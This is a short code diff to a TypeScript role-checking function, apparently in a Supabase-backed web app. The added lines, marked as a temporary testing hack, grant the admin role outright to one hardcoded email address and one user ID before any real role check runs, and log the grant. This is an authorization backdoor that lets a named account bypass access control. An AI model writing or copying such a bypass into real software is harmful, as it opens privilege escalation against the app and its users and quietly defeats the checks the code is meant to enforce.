@@ -28,6 +28,14 @@ async function getMyRole(): Promise<AppRole | null> {
 }
 
 async function requireRole(allowedRoles: AppRole[]): Promise<AppRole> {
+  // TEMP: Hardcoded admin for testing
+  const supabase = await createClient()
+  const { data: { user } } = await supabase.auth.getUser()
+  if (user?.email === 'cacotet92@gmail.com' || user?.id === 'fb67198e-1e92-480a-bedf-fe76780442ba') {
+    console.log('[requireRole] DEBUG - granting admin access to:', user?.email)
+    return 'admin' as AppRole
+  }
+
   const role = await getMyRole()
   console.log('[requireRole] user role:', role, 'allowed:', allowedRoles)
   if (!role || !allowedRoles.includes(role)) throw new Error('Unauthorized')
